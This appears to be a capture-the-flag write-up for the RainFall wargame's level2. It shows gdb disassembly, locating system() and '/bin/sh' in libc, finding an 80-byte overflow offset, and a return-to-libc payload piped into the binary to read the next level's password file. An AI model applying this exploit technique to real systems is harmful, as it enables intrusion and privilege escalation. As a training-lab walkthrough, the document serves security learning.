As seen in the disassembled code, the program uses the gets() function to take user input :

```
gdb ./level2
disass p
```

but this time we also see that check ensures that the return address is not overwritten with an address on the stack:

```
0x80484fb <p+39>:	and    eax,0xb0000000
0x8048500 <p+44>:	cmp    eax,0xb0000000
```
We find the address of the ret instruction:
```
0x804853e <p+106>:	ret
```

We will bypass this check using a return-to-libc exploit. First, we find the address of the system function in libc:
```
$> gdb ./level2
gdb> b main
gdb> r
gdb> p system
$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
```
in little-endian : `\x60\xb0\xe6\xb7`

To get the "/bin/sh" string to pass in, were going to have find it inside of libc
```
(gdb) find &system, +9999999, "/bin/sh"
0xb7f8cc58
```
We need to determine the offset at which the buffer overflows with the help of https://wiremask.eu/tools/buffer-overflow-pattern-generator/?:
```
level2@RainFall:~$ gdb ./level2 
(gdb) run
Starting program: /home/user/level2/level2 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A6Ac72Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? ()

```
We find that the buffer size is 80

Next, we need to construct the payload to exploit the vulnerability using the following format:
```
buffer + return address + system function address + fake return address + "/bin/sh" address from libc
```
```
$ (python -c "print 'A' * 80 + '\x44\x84\x04\x08' + '\x60\xb0\xe6\xb7' + 'AAAA' + '\x58\xcc\xf8\xb7'") > /tmp/payload2
$ cat /tmp/payload2 - | ./level2
$ cat /home/user/level3/.pass

```
